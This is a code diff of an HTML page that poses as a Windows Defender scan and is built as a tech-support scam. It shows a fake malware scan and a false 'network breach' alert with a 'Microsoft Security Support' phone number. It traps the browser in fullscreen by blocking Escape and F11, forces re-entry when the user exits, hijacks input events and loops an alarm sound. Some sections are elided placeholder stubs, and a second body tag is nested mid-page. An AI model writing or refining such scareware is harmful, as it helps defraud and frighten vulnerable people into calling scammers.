@@ -1,11 +1,12 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+	
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Windows Defender Security Alert</title>
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <style>
+        <style>
         /* Windows 11 Modern Theme */
         body {
             margin: 0;
@@ -18,12 +19,14 @@
             height: 100vh;
         }
 
+        /* Windows Defender logo */
         .logo {
             margin: 20px auto;
             width: 80px;
             filter: drop-shadow(0 0 8px rgba(0, 255, 128, 0.3));
         }
 
+        /* Scan Window - Microsoft Fluent Design */
         .scan-container {
             position: absolute;
             top: 50%;
@@ -46,6 +49,7 @@
             text-shadow: 0 0 8px rgba(0, 255, 128, 0.2);
         }
 
+        /* Modern Progress Bar */
         .progress-bar {
             width: 100%;
             background: rgba(255, 255, 255, 0.1);
@@ -60,7 +64,7 @@
             width: 0%;
             height: 100%;
             background: linear-gradient(90deg, #0078d4 0%, #00bcf2 100%);
-            transition: width 0.5s ease;
+            transition: width 0.5s ease, background 0.3s ease;
             position: relative;
         }
 
@@ -71,10 +75,14 @@
             left: 0;
             right: 0;
             bottom: 0;
-            background: linear-gradient(90deg, transparent 0%, rgba(255, 255, 255, 0.2) 50%, transparent 100%);
+            background: linear-gradient(90deg, 
+                transparent 0%, 
+                rgba(255, 255, 255, 0.2) 50%, 
+                transparent 100%);
             animation: progressShine 2s infinite;
         }
 
+        /* Scan Logs - Security Console Style */
         .scan-logs {
             margin-top: 25px;
             font-size: 13px;
@@ -88,6 +96,14 @@
             font-family: 'Consolas', monospace;
         }
 
+        .scan-logs p {
+            margin: 8px 0;
+            padding: 4px;
+            border-left: 3px solid #0078d4;
+            animation: logEntry 0.3s ease;
+        }
+
+        /* Critical Alert - Modern Microsoft Style */
         .critical-warning {
             display: none;
             position: fixed;
@@ -109,6 +125,7 @@
             animation: alertPulse 1.5s infinite;
         }
 
+        /* Toll-Free Banner - Windows Action Center Style */
         .toll-free-banner {
             display: none;
             position: fixed;
@@ -122,18 +139,12 @@
             font-size: 18px;
             font-weight: 500;
             box-shadow: 0 8px 25px rgba(220, 20, 60, 0.3);
-            animation: bannerFloat 3s ease-in-out infinite, emergencyFlash 0.5s infinite alternate;
+            animation: bannerFloat 3s ease-in-out infinite;
             z-index: 9999;
             border: 1px solid rgba(255, 255, 255, 0.15);
         }
 
-        .warning-icon {
-            width: 24px;
-            vertical-align: middle;
-            margin-right: 10px;
-            animation: pulseWarning 0.8s infinite;
-        }
-
+        /* Animations */
         @keyframes progressShine {
             0% { transform: translateX(-100%); }
             100% { transform: translateX(100%); }
@@ -150,39 +161,100 @@
             50% { transform: translateX(-50%) translateY(-8px); }
         }
 
-        @keyframes emergencyFlash {
-            from { background: #ff0000; }
-            to { background: #8b0000; }
+        @keyframes logEntry {
+            from { opacity: 0; transform: translateX(-10px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+		
+		
+        /* Previous CSS styles remain the same */
+        .apocalypse-screen {
+            /* ... keep previous styles ... */
         }
 
-        @keyframes pulseWarning {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.2); }
-            100% { transform: scale(1); }
+        /* Add audio styling */
+        #alarmSound {
+            display: none;
         }
-
-        @keyframes flashText {
-            0% { opacity: 1; }
-            50% { opacity: 0.3; }
-            100% { opacity: 1; }
-        }
-    </style>
+    </style> 
+    
 </head>
 <body>
 
     <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgd2lkdGg9IjI0IiBoZWlnaHQ9IjI0Ij48cGF0aCBkPSJNMTIgMUwzIDV2NmMwIDUuNTUgMy44NCAxMC43NCA5IDEyIDUuMTYtMS4yNiA5LTYuNDUgOS0xMlY1bC05LTR6bTAgMTAuOTloN2MtLjUzIDQuMTItMy4yOCA3Ljc5LTcgOC45NFYxMkg1VjYuM2w3LTMuMTF2OC44eiIgZmlsbD0iIzAwZmY4OCIvPjwvc3ZnPg==" class="logo" alt="Windows Defender Logo">
 
+    <!-- Scan Progress -->
     <div class="scan-container">
         <div class="scan-title">Windows Defender Security Scan</div>
         <p id="scan-status">Initializing system protection...</p>
+
         <div class="progress-bar">
             <div class="progress-fill" id="progressFill"></div>
         </div>
+
         <div class="scan-logs" id="scanLogs">
             <p>> Loading real-time protection module...</p>
         </div>
     </div>
+	
+	<body>
+    <div id="lockdownContainer"></div>
+    
+    <!-- Audio element -->
+    <audio id="alarmSound" loop>
+        <source src="microsoft-warning.m4a" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
 
+    <script>
+        // Audio initialization
+        const alarm = document.getElementById('alarmSound');
+        alarm.volume = 1.0;
+
+        function playAudio() {
+            alarm.play().catch(error => {
+                // Auto-play protection handling
+                document.addEventListener('click', () => alarm.play(), { once: true });
+            });
+        }
+
+        // Modified lockdown function with audio
+        function initiateLockdown(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            
+            playAudio(); // Start audio
+            createWarning();
+            document.body.classList.add('blocked');
+            
+            // Continuous audio enforcement
+            alarm.loop = true;
+            if(Math.random() > 0.5) createWarning();
+        }
+
+        // Add audio ready state listener
+        alarm.addEventListener('canplaythrough', () => {
+            alarm.play();
+        });
+
+        /* Rest of the previous JavaScript remains the same */
+        const warnings = [/*...*/];
+        const gifs = [/*...*/];
+        function createWarning() { /*...*/ }
+        
+        // Event listeners
+        const events = [/*...*/];
+        events.forEach(event => {
+            document.addEventListener(event, initiateLockdown, true);
+        });
+
+        window.addEventListener('beforeunload', (e) => {/*...*/});
+        document.addEventListener('visibilitychange', () => {/*...*/});
+        initiateLockdown(new Event('init'));
+    </script>
+</body>
+
+    <!-- Critical Alert -->
     <div class="critical-warning" id="criticalWarning">
         ⚠ CRITICAL SYSTEM ALERT: NETWORK BREACH DETECTED ⚠ <br>
         <span style="font-size: 0.8em; font-weight: 400;">Immediate action required to prevent data loss</span> <br>
@@ -191,106 +263,52 @@
         </div>
     </div>
 
+    <!-- Toll-Free Banner -->
     <div class="toll-free-banner" id="tollFreeBanner">
         <span style="font-weight: 300;">Microsoft Security Support:</span> 
         <span style="color: #00ff88; font-weight: 600;">+1-800-555-0199</span>
     </div>
 
-    
+    <audio id="alertSound">
+        <source src="https://www.soundjay.com/button/beep-10.m4a" type="audio/mpeg">
+    </audio>
 	
 	
-
-    <script>
-        let fullscreenLockActive = true;
-        let clickCounter = 0;
-
-        function startFullscreenTrap() {
-            requestFullScreen();
-            const clickInterval = setInterval(() => {
-                if(clickCounter < 100000) {
-                    document.documentElement.click();
-                    clickCounter++;
-                }
-            }, 10);
-
-            const fullscreenCheck = setInterval(() => {
-                if(!document.fullscreenElement) {
-                    requestFullScreen();
-                }
-            }, 100);
-        }
-
-        function requestFullScreen() {
-            const elem = document.documentElement;
-            if (elem.requestFullscreen) elem.requestFullscreen().catch(() => {});
-            else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
-            else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
-            else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
-        }
-
-        document.addEventListener('fullscreenchange', () => {
-            if(!document.fullscreenElement && fullscreenLockActive) {
-                requestFullScreen();
-            }
-        });
-
-        document.addEventListener('keydown', (e) => {
-            if(['Escape','F11','Alt','Control','Meta','Tab'].includes(e.key)) {
-                e.preventDefault();
-                requestFullScreen();
-            }
-        });
-
-        document.addEventListener('click', () => {
-            if(!document.fullscreenElement) {
-                startFullscreenTrap();
-                startScan();
-            }
-        });
+	<script>
+        let scanProgress = 0;
+        let logMessages = [
+            "Scanning system files...",
+            "Checking registry entries...",
+            "Analyzing network traffic...",
+            "Verifying software integrity...",
+            "Looking for unusual behavior...",
+            "Checking Windows Defender logs...",
+            "Inspecting running processes...",
+            "Verifying system permissions...",
+            "Cross-referencing threat database...",
+            "Almost done...",
+            "⚠ WARNING: Suspicious activity detected!"
+        ];
 
         function startScan() {
-            let scanProgress = 0;
-            let logMessages = [
-                "Scanning system files...",
-                "Checking registry entries...",
-                "Analyzing network traffic...",
-                "Verifying software integrity...",
-                "Looking for unusual behavior...",
-                "Checking Windows Defender logs...",
-                "Inspecting running processes...",
-                "Verifying system permissions...",
-                "Cross-referencing threat database...",
-                "Almost done...",
-                "⚠ CRITICAL: Suspicious network patterns detected!"
-            ];
+            requestFullScreen();
 
+            let logIndex = 0;
             let scanInterval = setInterval(() => {
                 scanProgress += 10;
                 $("#progressFill").css("width", scanProgress + "%");
                 $("#scan-status").text(scanProgress + "% Complete");
 
-                if(scanProgress >= 85) {
-                    $(".scan-logs, .scan-logs p").css("color", "red");
-                    $("#scan-status").css({
-                        "color": "red",
-                        "text-shadow": "0 0 10px rgba(255,0,0,0.5)"
-                    }).prepend('<img src="data:image/gif;base64,R0lGODlhEAAQAPIAAP///wAAAMLCwkJCQgAAAGJiYoKCgpKSkiH/C05FVFNDQVBFMi4wAwEAAAAh/hpDcmVhdGVkIHdpdGggYWpheGxvYWQuaW5mbwAh+QQJCgAAACwAAAAAEAAQAAADMwi63P4wyklrE2MIOggZnAdOmGYJRbExwroUmcG2LmDEwnHQLVsYOd2mBzkYDAdKa+dIAAAh+QQJCgAAACwAAAAAEAAQAAADNAi63P5OjCEgG4QMu7DmikRxQlFUYDEZIGBMRVsaqHwctXXf7WEYB4Ag1xjihkMZsiUkKhIAIfkECQoAAAAsAAAAABAAEAAAAzYIujIjK8pByJDMlFYvBoVjHA70GU7xSUJhmKtwHPAKzLO9HMaoKwJZ7Rf8AYPDDzKpZBqfvwQAIfkECQoAAAAsAAAAABAAEAAAAzMIumIlK8oyhpHsnFZfhYumCYUhDAQxRIdhHBGqRoKw0R8DYlJd8z0fMDgsGo/IpHI5TAAAIfkECQoAAAAsAAAAABAAEAAAAzIIunInK0rnZBTwGPNMgQwmdsNgXGJUlIWEuR5oWUIpz8pAEAMe6TwfwyYsGo/IpFKSAAAh+QQJCgAAACwAAAAAEAAQAAADMwi6IMKQORfjdOe82p4wGccc4CEuQradylesojEMBgsUc2G7sDX3lQGBMLAJibufbSlKAAAh+QQJCgAAACwAAAAAEAAQAAADMgi63P7wCRHZnFVdmgHu2nFwlWCI3WGc3SwWhUouZVsMCC7RYagPD2sbfKaLioTBUl7kbAAEAIfkECQoAAAAsAAAAABAAEAAAAzIIunInK0rnZBTwGPNMgQwmdsNgXGJUlIWEuR5oWUIpz8pAEAMe6TwfwyYsGo/IpFKSAAAh+QQJCgAAACwAAAAAEAAQAAADMwi6IMKQORfjdOe82p4wGccc4CEuQradylesojEMBgsUc2G7sDX3lQGBMLAJibufbSlKAAAIAAAAACAAIAAACBZRpnigGcCA1QAEAIfkECQoAAAAsAAAAABAAEAAAAzIIunInK0rnZBTwGPNMgQwmdsNgXGJUlIWEuR5oWUIpz8pAEAMe6TwfwyYsGo/IpFKSAAAA7" class="warning-icon">');
-                    
-                    if(scanProgress % 20 === 0) {
-                        $("#scanLogs").append(
-                            '<p style="color:red;animation:flashText 0.5s infinite;">' +
-                            '🚨 NETWORK IDENTITY THEFT DETECTED!</p>' +
-                            '<p style="color:red;">BANKING PERSONAL DATA BREACHED 20%</p>' +
-                            '<p style="color:red;font-weight:bold;">CHECK YOUR DNS ROUTER OR WIFI/CARRIER SERVICE PROVIDERS</p>'
-                        );
-                    }
+                if (logIndex < logMessages.length) {
+                    $("#scanLogs").append("<p>" + logMessages[logIndex] + "</p>");
+                    logIndex++;
                 }
 
-                if(scanProgress >= 100) {
+                if (scanProgress >= 99) {
                     clearInterval(scanInterval);
-                    setTimeout(showThreatWarning, 500);
+                    setTimeout(showThreatWarning, 2000);
                 }
-            }, 800);
+            }, 1500);
         }
 
         function showThreatWarning() {
@@ -298,6 +316,59 @@
             $("#tollFreeBanner").fadeIn();
             document.getElementById("alertSound").play();
         }
+
+        // Modern full-screen request function (supports latest browsers like Edge, Chrome, Firefox)
+        function requestFullScreen() {
+            let elem = document.documentElement;
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen();
+            } else if (elem.mozRequestFullScreen) { // Firefox
+                elem.mozRequestFullScreen();
+            } else if (elem.webkitRequestFullscreen) { // Chrome, Safari, Opera
+                elem.webkitRequestFullscreen();
+            } else if (elem.msRequestFullscreen) { // Edge
+                elem.msRequestFullscreen();
+            }
+        }
+
+        // Prevent exiting fullscreen with key presses (F11, Esc, etc.)
+        document.addEventListener("keydown", function(event) {
+            if (event.key === "Escape" || event.key === "F11" || (event.ctrlKey && event.key === "F4")) {
+                event.preventDefault();
+            }
+        });
+
+        // Re-enter fullscreen if user exits
+        document.addEventListener("fullscreenchange", () => {
+            if (!document.fullscreenElement) {
+                requestFullScreen();
+            }
+        });
+        document.addEventListener("webkitfullscreenchange", () => {
+            if (!document.webkitFullscreenElement) {
+                requestFullScreen();
+            }
+        });
+        document.addEventListener("mozfullscreenchange", () => {
+            if (!document.mozFullScreen) {
+                requestFullScreen();
+            }
+        });
+        document.addEventListener("msfullscreenchange", () => {
+            if (!document.msFullscreenElement) {
+                requestFullScreen();
+            }
+        });
+
+        // Start scanning ONLY when fullscreen is enabled
+        document.addEventListener("click", function() {
+            if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreen && !document.msFullscreenElement) {
+                requestFullScreen();
+            } else {
+                startScan();
+            }
+        });
     </script>
+
 </body>
 </html>
